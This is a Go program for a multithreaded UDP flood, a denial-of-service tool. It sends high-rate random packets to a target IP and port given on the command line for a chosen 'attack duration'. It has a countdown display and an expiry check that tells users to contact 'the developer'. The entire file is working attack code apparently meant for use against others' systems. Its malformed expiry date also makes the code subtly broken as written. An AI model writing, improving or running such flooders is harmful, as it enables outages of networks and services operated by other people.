package main

import (
 "fmt"
 "log"
 "math/rand"
 "net"
 "os"
 "os/signal"
 "runtime"
 "strconv"
 "sync"
 "syscall"
 "time"
)

const (
 packetSize    = 1400
 chunkDuration = 280
 expiryDate    = "2025-0-17T23:00:00"
)

func main() {
 checkExpiry()

 if len(os.Args) != 4 {
  fmt.Println("Usage: go run UDP.go <target_ip> <target_port> <attack_duration>")
  return
 }

 targetIP := os.Args[1]
 targetPort := os.Args[2]
 duration, err := strconv.Atoi(os.Args[3])
 if err != nil || duration <= 0 {
  fmt.Println("Invalid attack duration:", err)
  return
 }
 durationTime := time.Duration(duration) * time.Second

 numThreads := max(1, int(float64(runtime.NumCPU())*2.5))
 packetsPerSecond := 1_000_000_000 / packetSize

 var wg sync.WaitGroup
 done := make(chan struct{})
 signalChan := make(chan os.Signal, 1)
 signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

 go func() {
  <-signalChan
  close(done)
 }()

 go countdown(durationTime, done)

 for i := 0; i < numThreads; i++ {
  wg.Add(1)
  go sendUDPPackets(targetIP, targetPort, packetsPerSecond/numThreads, durationTime, &wg, done)
 }

 wg.Wait()
 close(done)
}

func checkExpiry() {
 currentDate := time.Now()
 expiry, _ := time.Parse("2006-01-02T15:04:05", expiryDate)
 if currentDate.After(expiry) {
  fmt.Println("This script has expired. Please contact the developer for a new version.")
  os.Exit(1)
 }
}

func sendUDPPackets(ip, port string, packetsPerSecond int, duration time.Duration, wg *sync.WaitGroup, done chan struct{}) {
 defer wg.Done()
 packet := generatePacket(packetSize)
 interval := time.Second / time.Duration(packetsPerSecond)
 deadline := time.Now().Add(duration)
 backoff := 1

 for time.Now().Before(deadline) {
  select {
  case <-done:
   return
  default:
   conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
   if err != nil {
    log.Printf("Error connecting: %v\n", err)
    if backoff < 10 {
     backoff *= 2
    }
    time.Sleep(time.Millisecond * time.Duration(rand.Intn(100*backoff)))
    continue
   }
   defer conn.Close()
   backoff = 1

   sendPackets(conn, packet, interval, deadline, done)
  }
 }
}

func sendPackets(conn net.Conn, packet []byte, interval time.Duration, deadline time.Time, done chan struct{}) {
 for time.Now().Before(deadline) {
  select {
  case <-done:
   return
  default:
   _, err := conn.Write(packet)
   if err != nil {
    log.Printf("Error sending UDP packet: %v\n", err)
    return
   }
   time.Sleep(interval)
  }
 }
}

func countdown(duration time.Duration, done chan struct{}) {
 ticker := time.NewTicker(1 * time.Second)
 defer ticker.Stop()

 for remainingTime := duration; remainingTime > 0; remainingTime -= time.Second {
  select {
  case <-ticker.C:
   fmt.Printf("\rTime remaining: %s", remainingTime.String())
  case <-done:
   fmt.Println("\rAttack interrupted.")
   return
  }
 }
 fmt.Println("\rTime remaining: 0s")
}

func isDone(done chan struct{}) bool {
 select {
 case <-done:
  return true
 default:
  return false
 }
}

func generatePacket(size int) []byte {
 packet := make([]byte, size)
 for i := 0; i < size; i++ {
  packet[i] = byte(rand.Intn(256))
 }
 return packet
}

func max(x, y int) int {
 if x > y {
  return x
 }
 return y
}

func cleanup() {
 log.Println("Performing cleanup tasks...")
}
